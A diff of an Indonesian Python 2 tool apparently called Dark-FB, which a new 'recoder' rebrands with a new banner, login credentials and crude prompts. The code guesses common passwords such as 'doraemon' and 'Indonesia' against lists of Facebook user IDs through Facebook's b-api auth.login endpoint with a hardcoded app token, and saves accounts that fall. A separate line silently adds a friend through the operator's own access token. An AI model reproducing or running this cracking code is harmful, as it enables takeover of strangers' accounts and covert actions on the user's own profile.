@@ -46,7 +46,13 @@ def jalan(z):
 		time.sleep(0.05)
 		
 		
-logo = """  \x1b[1;93m______   \x1b[1;92m_______  \x1b[1;94m______    \x1b[1;91m___   _\n \x1b[1;93m|      | \x1b[1;92m|   _   |\x1b[1;94m|    _ |  \x1b[1;91m|   | | |\n \x1b[1;93m|  _    |\x1b[1;92m|  |_|  |\x1b[1;94m|   | ||  \x1b[1;91m|   |_| |\n \x1b[1;93m| | |   |\x1b[1;92m|       |\x1b[1;94m|   |_||_ \x1b[1;91m|      _|\n \x1b[1;93m| |_|   |\x1b[1;92m|       |\x1b[1;94m|    __  |\x1b[1;91m|     |_ \n \x1b[1;93m|       |\x1b[1;92m|   _   |\x1b[1;94m|   |  | |\x1b[1;91m|    _  |\n \x1b[1;93m|______| \x1b[1;92m|__| |__|\x1b[1;94m|___|  |_|\x1b[1;91m|___| |_| \x1b[1;96mFB\n\n \x1b[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n ✫╬─ \x1b[1;92mReCode \x1b[1;91m: \x1b[1;93momalip                   \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mFB    \x1b[1;92m \x1b[1;91m: \x1b[1;96mFacebook.com/theomalip     \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mGitHub \x1b[1;91m: \x1b[1;94mGithub.com/storiku     \x1b[1;95m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+logo = """  █████████
+ █▄█████▄█         ●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+ █ ▼▼▼▼▼  - _ --_-- ╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
+ █    \x1b[1;97m_-_-- -_ --__  ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+ █ ▲▲▲▲▲ --  - _ -- ═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  PHB
+ █████████         «==========✧==========»
+  ██ ██  \x1b[1;91m \x1b[1;96mSUB:SNIPER DANGIANG TIRTA VLOG vlog\n\n \x1b[1;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\n ✫╬─ \x1b[1;92mRECODE \x1b[1;91m: \x1b[1;93mILFAN MUHAMMAD                  \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92mbuat lu    \x1b[1;92m \x1b[1;91m: \x1b[1;96mmembuat tidak semudah memakai     \x1b[1;95m─╬✫\n ✫╬─ \x1b[1;92msorry \x1b[1;91m  \x1b[1;93msaya bukan hacker     \x1b[1;95m─╬✫\n ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 """
 
 def tik():
@@ -67,29 +73,29 @@ vuln = "\033[32mVuln"
 
 def siapa():
 	os.system('clear')
-	nama = raw_input("\033[1;97mSiapa nama kamu ? \033[1;91m: \033[1;92m")
+	nama = raw_input("\033[1;97mSiapa nama pacar kamu,jika tidak punya pacar mati aja lu..masukan nama pacar.? \033[1;91m: \033[1;92m")
 	if nama =="":
 		print"\033[1;96m[!] \033[1;91mIsi yang benar"
 		time.sleep(1)
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini !!")
+		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini..hargai si pembuat..jangan di jual belikan. [•]subscribe chanel abang aku ya..   !!")
 		time.sleep(1)
 		loginSC()
 		
 		
 def loginSC():
 	os.system('clear')
-	print"\033[1;97mSilahkan login SC nya dulu bosque\n"
+	print"\033[1;97mSilahkan login SC nya dulu..jka belum tau username dan password tanyakan pada si pbuat script ini...password dan username nya jangan di kasih tau sama orang lain..harus ijin dulu\n"
 	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="dark" and password =="fb":
-		print"\033[1;96m[✓] \033[1;92mLogin success"
+	if username =="ILFAN" and password =="Muhammad":
+		print"\033[1;96m[✓] \033[1;92mLogin Berhasil.buat lu nanti jika login facebook berhasil akan di arahkan ke youtube trs subscribe dulu chanel nya.. .."
 		time.sleep(1)
 		login()
 	else:
-		print"\033[1;96m[!] \033[1;91mSalah!!"
+		print"\033[1;96m[!] \033[1;91mSalah bangsat.. !!"
 		time.sleep(1)
                 LoginSC()
 
@@ -131,9 +137,9 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
+				print '\n\033[1;96m[✓] \x1b[1;92myes berhasil..'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://youtu.be/LVGIt2Rb3dc')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
@@ -189,7 +195,7 @@ def menu():
 
 
 def pilih():
-	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
+	unikers = raw_input("\n\033[1;97m ╰──────>♡[ILFAN]●> \033[1;97m")
 	if unikers =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		pilih()
@@ -232,7 +238,7 @@ def super():
 	pilih_super()
 
 def pilih_super():
-	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
+	peak = raw_input("\n\033[1;97m ╰──────>♡[ILFAN]●> \033[1;97m")
 	if peak =="":
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		pilih_super()
@@ -302,9 +308,9 @@ def pilih_super():
 	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mSabar jomblo \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print('\x1b[1;96m[!] \x1b[1;93mjika akun nya sudah menang uing menta')
 	print 42*"\033[1;96m="
 	
 			
@@ -338,7 +344,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = b['first_name']+'12345'
+					pass2 = 'doraemon'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -358,7 +364,7 @@ def pilih_super():
 							cek.close()
 							cekpoint.append(user+pass2)
 						else:
-							pass3 = b['last_name'] + '123'
+							pass3 = 'Indonesia'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
@@ -378,7 +384,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Bangsat'
+									pass4 = 'Anjing'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -398,8 +404,8 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											birthday = b['birthday']
-											pass5 = birthday.replace('/', '')
+											
+										        pass5 = 'barbar'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -419,7 +425,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'Sayang'
+													pass6 = 'bagong'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -875,3 +881,4 @@ def clone_dari_file():
 		
 if __name__ == '__main__':
 	siapa()
+ 
